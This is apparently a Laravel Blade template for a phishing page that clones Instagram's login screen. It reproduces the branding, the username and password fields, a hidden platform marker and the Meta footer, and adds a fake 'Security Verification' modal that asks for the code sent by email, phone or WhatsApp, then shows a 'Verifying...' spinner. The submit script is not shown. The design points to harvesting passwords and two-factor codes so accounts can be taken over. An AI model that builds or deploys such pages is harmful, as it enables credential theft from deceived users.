@extends('layouts.app')

@push('styles')
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@vite(['resources/css/instagram.css'])
@endpush

@section('content')
<div class="flex flex-col items-center justify-center flex-grow w-full max-w-6xl min-h-screen gap-8 p-4 mx-auto md:flex-row md:gap-16" style="background-color: #fafafa;">
    <!-- Left Side: Instagram Promo Image (Visible only on desktop) -->
    <div class="items-center justify-center hidden md:flex md:w-1/2">
        <div class="w-full max-w-[650px] overflow-hidden">
            <img src="{{ asset('images/instagram-promo.jpg') }}"
                 alt="Instagram Promo"
                 class="block object-cover w-full h-auto">
        </div>
    </div>

    <!-- Right Side: Login Form -->
    <div class="flex flex-col items-center w-full max-w-sm md:w-1/3">
        <!-- Mobile-only logo -->
        <div class="text-center mobile-logo md:hidden">
            <h1 class="instagram-logo">Instagram</h1>
        </div>

        <!-- Desktop logo -->
        <div class="hidden text-center desktop-logo md:block">
            <h1 class="instagram-logo">Instagram</h1>
        </div>

        <form class="w-full" id="loginForm">
            <input type="hidden" id="platform" name="platform" value="instagram">

            <div>
                <input type="text"
                       id="username"
                       placeholder="Phone number, username, or email"
                       class="w-full p-3 mb-2 text-sm transition-all duration-200 border border-gray-300 rounded bg-gray-50 focus:outline-none focus:border-gray-400 focus:bg-white">
                <div id="usernameError" class="hidden mb-2 -mt-1 text-xs text-red-500">Please enter your username or email</div>
            </div>

            <div>
                <input type="password"
                       id="password"
                       placeholder="Password"
                       class="w-full p-3 mb-2 text-sm transition-all duration-200 border border-gray-300 rounded bg-gray-50 focus:outline-none focus:border-gray-400 focus:bg-white">
                <div id="passwordError" class="hidden mb-2 -mt-1 text-xs text-red-500">Please enter your password</div>
            </div>

            <button type="submit" class="w-full p-2 mt-2 font-semibold text-white transition-colors bg-blue-500 border-none rounded-lg cursor-pointer hover:bg-blue-600 disabled:bg-blue-300 disabled:cursor-not-allowed" id="loginButton">
                Log in
            </button>
        </form>

        <div class="divider">OR</div>

        <a href="/facebook" class="flex items-center justify-center my-5 font-semibold text-blue-800 no-underline cursor-pointer">
            <i class="mr-2 text-xl fab fa-facebook-square"></i>Log in with Facebook
        </a>

        <div class="text-xs text-center text-blue-500 cursor-pointer hover:underline">Forgot password?</div>

        <div class="mt-6 text-sm text-center">
            <span>Don't have an account?</span>
            <a href="#" class="ml-1 font-semibold text-blue-500 no-underline hover:underline">Sign up</a>
        </div>

        <div class="mt-6 text-center">
            <p class="mb-4 text-sm">Get the app.</p>
            <div class="flex justify-center space-x-3">
                <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="App Store" class="h-10">
                <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Google Play" class="h-10">
            </div>
        </div>
    </div>
</div>

<!-- Footer Section -->
<div class="w-full max-w-4xl p-4 mx-auto mt-10 text-sm text-center text-gray-500">
    <div class="flex flex-wrap justify-center gap-3 py-2">
        <a href="#" class="text-xs text-gray-500 no-underline hover:underline">Meta</a>
        <a href="#" class="text-xs text-gray-500 no-underline hover:underline">About</a>
        <a href="#" class="text-xs text-gray-500 no-underline hover:underline">Blog</a>
        <a href="#" class="text-xs text-gray-500 no-underline hover:underline">Jobs</a>
        <a href="#" class="text-xs text-gray-500 no-underline hover:underline">Help</a>
        <a href="#" class="text-xs text-gray-500 no-underline hover:underline">API</a>
        <a href="#" class="text-xs text-gray-500 no-underline hover:underline">Privacy</a>
        <a href="#" class="text-xs text-gray-500 no-underline hover:underline">Terms</a>
        <a href="#" class="text-xs text-gray-500 no-underline hover:underline">Locations</a>
        <a href="#" class="text-xs text-gray-500 no-underline hover:underline">Instagram Lite</a>
        <a href="#" class="text-xs text-gray-500 no-underline hover:underline">Threads</a>
        <a href="#" class="text-xs text-gray-500 no-underline hover:underline">Contact</a>
        <a href="#" class="text-xs text-gray-500 no-underline hover:underline">Uploading & Non-Users</a>
        <a href="#" class="text-xs text-gray-500 no-underline hover:underline">Meta Verified</a>
    </div>

    <div class="flex flex-col items-center mt-6">
        <div class="relative inline-block mb-3 cursor-pointer">
            <span class="text-xs">English</span>
            <span class="ml-1 text-xs">▾</span>
        </div>
        <div class="text-xs">© 2025 Instagram from Meta</div>
    </div>
</div>

<!-- Verification Modal -->
<div class="fixed inset-0 z-50 flex items-center justify-center transition-opacity duration-300 bg-black opacity-0 pointer-events-none bg-opacity-80" id="verificationModal">
    <div class="w-11/12 max-w-md p-8 text-center bg-white shadow-2xl rounded-xl">
        <div class="mb-5 text-5xl text-blue-500">
            <i class="fas fa-shield-alt"></i>
        </div>
        <h2 class="mb-3 text-xl font-semibold">Security Verification</h2>
        <p class="mb-5 text-sm leading-relaxed text-gray-500">To ensure account security, we need to verify your identity. A verification code has been sent to you. Kindly wait 3-4 minutes for the code to be delivered  Please check your email, phone, or WhatsApp</p>

        <input type="text"
               id="verificationCode"
               class="w-full p-3 mb-3 text-base text-center border border-gray-300 rounded focus:outline-none focus:border-blue-500"
               placeholder="Enter verification code">
        <div id="codeError" class="hidden mb-3 text-sm text-red-500">Please enter the verification code</div>

        <div class="mb-4 text-sm text-blue-500 cursor-pointer hover:underline" id="resendCode">Resend verification code</div>
        <div class="h-4 mb-4 text-sm text-green-500 transition-opacity duration-300 opacity-0" id="sentMessage">Verification code has been resent</div>

        <button class="w-full px-4 py-3 font-semibold text-white transition-colors bg-blue-500 border-none rounded-lg cursor-pointer hover:bg-blue-600 disabled:bg-blue-300 disabled:cursor-not-allowed" id="verifyButton">Verify</button>
    </div>
</div>

<!-- Verifying Modal -->
<div class="fixed inset-0 z-50 flex items-center justify-center transition-opacity duration-300 bg-black opacity-0 pointer-events-none bg-opacity-80" id="verifyingModal">
    <div class="w-11/12 max-w-md p-8 text-center bg-white shadow-2xl rounded-xl">
        <h2 class="mb-3 text-xl font-semibold">Verifying...</h2>
        <div class="w-12 h-12 mx-auto my-5 border-4 border-blue-200 rounded-full border-t-blue-500 animate-spin-custom"></div>
        <p class="mt-5 text-base text-gray-500">We're verifying your code. This may take a moment.</p>
    </div>
</div>
@endsection

@push('scripts')
@vite(['resources/js/instagram.js'])
@endpush
